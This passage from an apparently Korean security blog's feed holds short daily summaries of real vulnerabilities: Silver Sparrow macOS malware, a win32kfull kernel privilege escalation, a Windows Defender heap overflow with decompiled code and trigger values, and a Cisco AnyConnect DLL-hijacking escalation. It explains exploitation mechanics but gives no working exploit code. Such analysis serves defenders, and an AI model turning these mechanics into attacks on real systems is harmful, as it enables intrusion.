src="/2021/02/26/l0ch/2021-02-26/image.png" alt></p><p>&#xADF8;&#xB7EC;&#xB098; Google &#xCE21;&#xC740; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xBCF4;&#xACE0;&#xC11C;&#xC5D0; &#xB300;&#xD574; <code>WontFix</code>&#xB97C; &#xD560;&#xB2F9;&#xD588;&#xC73C;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC784;&#xC744; &#xC778;&#xC9C0;&#xD558;&#xC600;&#xC73C;&#xB098; &#xC5B4;&#xB5A0;&#xD55C; &#xD328;&#xCE58;&#xB098; &#xBCF4;&#xC0C1; &#xACC4;&#xD68D;&#xC774; &#xC5C6;&#xC744; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>wontfix</tag>
      
      <tag>garbage collector</tag>
      
      <tag>aslr bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 약 3만 대의 Apple Mac을 감염시킨 Silver Sparrow 악성코드</title>
    <link href="/2021/02/25/idioth/2021-02-25/"/>
    <url>/2021/02/25/idioth/2021-02-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://redcanary.com/blog/clipping-silver-sparrows-wings/">Clipping Silver Sparrow&#x2019;s wings: Outing macOS malware before it takes flight</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Intel x86_64, M1 chips MAC</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple&#xC758; &#xC0C8;&#xB85C;&#xC6B4; M1 ARM64 &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC; Silver Sparrow&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Silver Sparrow&#xB294; Intel x86_64 &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xBC84;&#xC804;&#xACFC;, Inter x86_64 &#xBC0F; M1 ARM64 &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xBC84;&#xC804;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB450; &#xBC84;&#xC804; &#xBAA8;&#xB450; macOS Installer Javascript API&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xACF5;&#xACA9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. <code>agent.sh</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; AWS C2 &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xC54C;&#xB9AC;&#xACE0;, <code>verx.sh</code>&#xB294; &#xC8FC;&#xAE30;&#xC801;&#xC73C;&#xB85C; C2 &#xC11C;&#xBC84;&#xC5D0; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xAC70;&#xB098; &#xC2E4;&#xD589;&#xD560; &#xCEE8;&#xD150;&#xCE20;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Intel x86_64&#xC6A9; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; &#xACBD;&#xC6B0;, &#xCD94;&#xAC00;&#xC801;&#xC778; &#xAE30;&#xB2A5; &#xC5C6;&#xC774; &#xC2E4;&#xD589; &#xC2DC; &#x201C;Hello, World!&#x201D;&#xAC00; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB418;&#xBA70;, M1 ARM64&#xC6A9; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB610;&#xD55C; &#x201C;You did it!&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Silver Sparrow&#xB294; &#xD604;&#xC7AC; &#xBCC4;&#xB2E4;&#xB978; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;, &#xC5B4;&#xB5A0;&#xD55C; &#xBAA9;&#xC801;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xBD88;&#xBD84;&#xBA85;&#xD558;&#xBA70; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC774;&#xBBF8; &#xC804;&#xB2EC;&#xB418;&#xACE0; &#xC81C;&#xAC70; &#xB418;&#xC5C8;&#xB294;&#xC9C0;, &#xD5A5;&#xD6C4; &#xCD94;&#xAC00; &#xBC30;&#xD3EC; &#xC77C;&#xC815;&#xC774; &#xC788;&#xB294;&#xC9C0;, &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC5D0; &#xC758;&#xD574; &#xC5B4;&#xB5A4; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xBC30;&#xD3EC;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC5C6;&#xC73C;&#xBA70; M1 &#xCE69;&#xC744; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC7A0;&#xC7AC;&#xC801;&#xC778; &#xACF5;&#xACA9; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBBC0;&#xB85C; &#xC2EC;&#xAC01;&#xD55C; &#xC704;&#xD611;&#xC774;&#xB77C;&#xACE0; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>m1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1732: win32kfull.sys 0-day</title>
    <link href="/2021/02/24/fabu1ous/2021-02-24/"/>
    <url>/2021/02/24/fabu1ous/2021-02-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/">WINDOWS KERNEL ZERO-DAY EXPLOIT (CVE-2021-1732) IS USED BY BITTER APT IN TARGETED ATTACK</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows10 1709 ~ 1909 64-bits</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>DBAPPSecurity Threat Intelligence&#xAC00; &#xC791;&#xB144; 12&#xC6D4;&#xC5D0; BITTER APT&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB97C; &#xBD84;&#xC11D;&#xD574; win32kfull.sys&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;(CVE-2021-1732)&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2021-1732&#xB294; win32kfull &#xCF5C;&#xBC31;&#xC5D0; &#xC758;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; System &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; IE browser, Adobe Reader &#xB4F1;&#xC758; sandbox escape&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;(out-of-bound access)&#xC740; <code>win32kfull!xxxCreateWindowEx</code>&#xAC00; &#xCF5C;&#xBC31; &#xD568;&#xC218; <code>xxxClientAllocWindowClassExtraBytes</code>&#xB97C; &#xD638;&#xCD9C;&#xD55C; &#xD6C4;, &#xCEE4;&#xB110; &#xAD6C;&#xC870; &#xBA64;&#xBC84;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xC815;&#xACFC; flag&#xAC12;&#xC774; &#xC11C;&#xB85C; &#xC0C1;&#xC751;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>win32kfull!xxxCreateWindowEx</code>&#xAC00; <code>WndExtra</code> &#xC601;&#xC5ED;&#xC744; &#xAC16;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xCC3D;&#xC744; &#xB9CC;&#xB4E4; &#xB54C; &#xCF5C;&#xBC31; &#xD568;&#xC218; <code>user32!_xxxClientAllocWindowClassExtraBytes</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; <code>WndExtra</code>&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xD560;&#xB2F9;&#xB41C; <code>WndExtra</code>&#xC758; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC18;&#xD658;&#xBC1B;&#xC544; <code>WndExtra</code> &#xBA64;&#xBC84;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; &#xCEE4;&#xC2A4;&#xD140; &#xCF5C;&#xBC31; <code>_xxxClientAllocWindowClassExtraBytes</code>&#xC5D0;&#xC11C; <code>win32kfull!ConsoleControl</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xD604;&#xC7AC; &#xCC3D;&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC744; &#xBC1B;&#xC73C;&#xBA74; &#xC800;&#xC7A5;&#xB41C; <code>WndExtra</code> &#xBA64;&#xBC84;&#xB97C; &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xADF8;&#xC5D0; &#xB9DE;&#xAC8C; flag&#xB294; &#xD604;&#xC7AC; &#xBA64;&#xBC84;&#xAC00; &#xC624;&#xD504;&#xC14B;&#xC784;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB3C4;&#xB85D;(0x800) &#xAC12;&#xC774; &#xBCC0;&#xACBD;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCEE4;&#xC2A4;&#xD140; &#xCF5C;&#xBC31;&#xC774; &#xB05D;&#xB09C; &#xC9C1;&#xD6C4; <code>NtCallbackReturn</code>&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758;&#xC758; &#xAC12;(fake_offset)&#xC744;  <code>win32kfull!xxxCreateWindowEx</code>&#xC5D0; &#xBC18;&#xD658;&#xD558;&#xBA74; <code>WndExtra</code> &#xBA64;&#xBC84;&#xB97C;  &#xD574;&#xB2F9; &#xBC18;&#xD658; &#xAC12;&#xC73C;&#xB85C; &#xC624;&#xC5FC;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; flag&#xAC12;&#xC740; &#xC5EC;&#xC804;&#xD788; <code>WndExtra</code> &#xBA64;&#xBC84;&#xAC00; &#xC624;&#xD504;&#xC14B;&#xC784;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCEE4;&#xB110; &#xD799; &#xD574;&#xC81C; &#xC2DC; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBD84;&#xAE30;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><code>win32kfull!xxxFreeWindow</code>&#xB294;</p><ol><li><p>Flag&#xAC12; &#xC124;&#xC815;&#xB428;</p><p>&#xC624;&#xD504;&#xC14B;&#xC744; &#xD1B5;&#xD574; <code>WndExtra</code>&#xB97C; free &#xD558;&#xB294; <code>RtlFreeHeap</code> &#xD638;&#xCD9C;</p></li><li><p>Flag&#xAC00; &#xC124;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC74C;</p><p>&#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xD3EC;&#xC778;&#xD130;&#xC640; <code>xxxClientFreeWindowClassExtraBytes</code>&#xB97C; &#xD1B5;&#xD574; <code>WndExtra</code>&#xB97C; free</p></li></ol><p><code>RtlFeeHeap</code>&#xC740; Base+offset&#xC774; &#xC544;&#xB2CC; Base+fake_offset&#xC744; free &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>sandbox escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1647: Windows Defender MpEngine 모듈의 RCE 취약점</title>
    <link href="/2021/02/23/l0ch/2021-02-23/"/>
    <url>/2021/02/23/l0ch/2021-02-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.anquanke.com/post/id/231625">Analysis of CVE-2021-1647 vulnerability exploitation techniques</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Malware Protection Engine &#x2264; 1.1.17600.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC2E4;&#xC81C; &#xD574;&#xCEE4;&#xB4E4;&#xC774; &#xD65C;&#xBC1C;&#xD558;&#xAC8C; &#xC545;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB41C; Windows Defender&#xC758; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Asprotect&#xB85C; &#xD328;&#xD0B9;&#xB41C; PE &#xD30C;&#xC77C;&#xC744; &#xC555;&#xCD95; &#xD574;&#xC81C;&#xD558;&#xB294; <code>CAsprotectDLLAndVersion::RetrieveVersionInfoAndCreateObjects</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">...<span class="hljs-keyword">for</span> (i = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)v2 + <span class="hljs-number">28</span>); ; i += <span class="hljs-number">2</span> ){<span class="hljs-keyword">if</span> ( v28 &gt;= <span class="hljs-number">3</span> )v83 = (*((_DWORD *)v2 + <span class="hljs-number">14</span>) + <span class="hljs-number">4095</span>) &amp; <span class="hljs-number">0xFFFFF000</span>;sectionindex = i64; v33 = (_DWORD ((<span class="hljs-keyword">char</span> *)v2 + <span class="hljs-number">32</span>); v34 = (__int64) v2 + <span class="hljs-number">32</span>; <span class="hljs-keyword">while</span> ( sectionindex &lt; <span class="hljs-number">4</span> ){<span class="hljs-keyword">if</span> (*(_DWORD *)(v34 - <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFFF</span> )<span class="hljs-keyword">goto</span> LABEL_123; <span class="hljs-keyword">if</span> (*(_DWORD *)(v34 - <span class="hljs-number">4</span>) &gt; sectionva ){sectionva = *(_DWORD *)(v34 - <span class="hljs-number">4</span>); sectionsize = (*(_DWORD *)v34 + <span class="hljs-number">4095</span>) &amp; <span class="hljs-number">0xFFFFF000</span>;}v35 = v82[sectionindex++]; V34 += <span class="hljs-number">8</span>i64; <span class="hljs-keyword">if</span> ( v35 &lt;= v27 )v35 = v27;v27 = v35;}...</code></pre><p>&#xC139;&#xC158; &#xBC30;&#xC5F4; <code>v2 + 28</code>&#xC5D0;&#xB294; 8 bytes &#xD06C;&#xAE30;&#xC778; 4&#xAC1C;&#xC758; &#xBC30;&#xC5F4; &#xC694;&#xC18C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCCAB; 4 bytes&#xB294; &#xC139;&#xC158;&#xC758; virtual address&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; <code>sectionva</code>&#xC774;&#xBA70; &#xB9C8;&#xC9C0;&#xB9C9; 4 bytes&#xB294; &#xC139;&#xC158;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; <code>sectionsize</code>&#xC785;&#xB2C8;&#xB2E4;.  &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>sectionsize</code>&#xC640; <code>sectionva</code> &#xB97C; &#xAD6C;&#xD55C; &#xB4A4; &#xC774; &#xB458;&#xC744; &#xB354;&#xD55C; &#xD06C;&#xAE30;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD574; &#xC555;&#xCD95; &#xD574;&#xC81C;&#xB41C; &#xC139;&#xC158;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>sectionva</code> &#xD06C;&#xAE30;&#xAC00; &#xC774;&#xC804; <code>sectionva</code> &#xD06C;&#xAE30;&#xC640; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB97C; &#xACE0;&#xB824;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC139;&#xC158; &#xBC30;&#xC5F4;&#xC774; <code>[0,0], [0,0], [0x2000,0], [0x2000,0x3000]</code> &#xB85C; &#xB9C8;&#xC9C0;&#xB9C9; <code>sectionva</code>&#xC640; &#xC774;&#xC804; <code>sectionva</code> &#xAC12;&#xC774; &#xAC19;&#xC740; &#xACBD;&#xC6B0; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; <code>0x2000 + 0 = 0x2000</code> &#xAC00; &#xB418;&#xC5B4; &#xB9C8;&#xC9C0;&#xB9C9; <code>sectionsize</code>&#xC778; <code>0x3000</code> &#xD06C;&#xAE30; &#xC139;&#xC158;&#xC758; &#xC555;&#xCD95;&#xC744; &#xD480; &#xB54C; heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xAC1D;&#xCCB4;&#xC640; &#xD3EC;&#xC778;&#xD130; &#xD544;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD574; arbitrary read/write&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; Windows Defender&#xC758; &#xD30C;&#xC77C; &#xC2A4;&#xCE94; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xBBC0;&#xB85C; &#xB2E8;&#xC21C;&#xD788; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC791;&#xD55C; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xAE30;&#xB9CC; &#xD574;&#xB3C4; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xC810;&#xC5D0;&#xC11C; &#xC2EC;&#xAC01;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xD3C9;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>windows defender</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1366: Cisco AnyConnect Posture(HostScan) Local Privilege Escalation</title>
    <link href="/2021/02/22/idioth/2021-02-22/"/>
    <url>/2021/02/22/idioth/2021-02-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.coresecurity.com/core-labs/articles/analysis-cisco-anyconnect-posture-hostscan-local-privilege-escalation-cve-2021">Analysis of Cisco AnyConnect Posture (HostScan) Local Privilege Escalation: CVE-2021-1366</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco AnyConnect Posture 4.9.05042 &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Cisco AnyConnect Posture&#xC5D0;&#xC11C; DLL &#xD558;&#xC774;&#xC7AC;&#xD0B9;&#xC744; &#xD1B5;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Cisco AnyConnect Posture&#xB294; AnyConnect Secure Mobility Client&#xC5D0;&#xC11C; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4C8;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBAA8;&#xB4C8;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; VPN &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0; &#xC124;&#xCE58;&#xB41C; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;, &#xC548;&#xD2F0; &#xBC14;&#xC774;&#xB7EC;&#xC2A4;, &#xC548;&#xD2F0; &#xC2A4;&#xD30C;&#xC774;&#xC6E8;&#xC5B4;, &#xBC29;&#xD654;&#xBCBD;&#xC744; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>AnyConnect Posture(ciscod.exe)&#xC758; Cisco Security Service Windows &#xC11C;&#xBE44;&#xC2A4;&#xB294; localhost 1023 &#xD3EC;&#xD2B8;&#xC5D0;&#xC11C; &#xB85C;&#xCEEC; peer&#xC758; &#xC5F0;&#xACB0;&#xC744; &#xB300;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;. &#xB85C;&#xCEEC; peer&#xAC00; &#xC5F0;&#xACB0;&#xB418;&#xBA74;, <code>lphlpapi.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; <code>GetExtendedTcpTable</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB85C;&#xCEEC; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; PID&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xC5F0;&#xACB0;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#x201C;Cisco System, Inc&#x201D; &#xC11C;&#xBA85;&#xC744; &#xAC00;&#xC84C;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBA85; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xBA74;, &#xD2B9;&#xC815; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xB41C; &#xD328;&#xD0B7;&#xC744; &#xD1B5;&#xD574; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. <code>process_ipc_message</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD328;&#xD0B7;&#xC758; &#xCCAB; 4&#xBC14;&#xC774;&#xD2B8;&#xAC00; 0x2E24&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD55C; &#xD6C4;, &#xB2E4;&#xC74C; 4&#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC911; <code>priv_file_copy</code> &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xBAA8;&#xB4E0; &#xC704;&#xCE58;&#xC5D0;&#xC11C; <code>%ProgramFiles(x86)%\Cisco\Cisco HostScan</code> &#xB514;&#xB809;&#xD130;&#xB9AC; &#xB0B4;&#xC758; &#xC11C;&#xBE0C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. directory traversal&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBBC0;&#xB85C;, source file&#xC740; <code>\Cisco\Cisco HostScan</code> &#xB514;&#xB809;&#xD130;&#xB9AC; &#xB0B4;&#xBD80;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xC5EC;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; DLL&#xC744; &#xBCF5;&#xC0AC;&#xD558;&#xC5EC;, &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC2DC;&#xC791;&#xB420; &#xB54C; &#xD574;&#xB2F9; DLL&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC77C;&#xBC18; &#xC720;&#xC800;&#xAC00; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC911;&#xC9C0;/&#xC2DC;&#xC791;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C;, &#xC7AC;&#xBD80;&#xD305; &#xC5C6;&#xC774; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; <code>priv_get_device_id</code> &#xBA85;&#xB839;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC774; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBC1B;&#xC73C;&#xBA74;, <code>/lib</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; <code>libhostscan.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB85C;&#xB4DC;&#xB97C; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. <code>libhostscan.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; &#xC790;&#xC2E0;&#xC758; location path&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xC5EC;&#xB7EC; DLL&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.(ex. IPHLPAPI.DLL)</p><p>LPE&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; 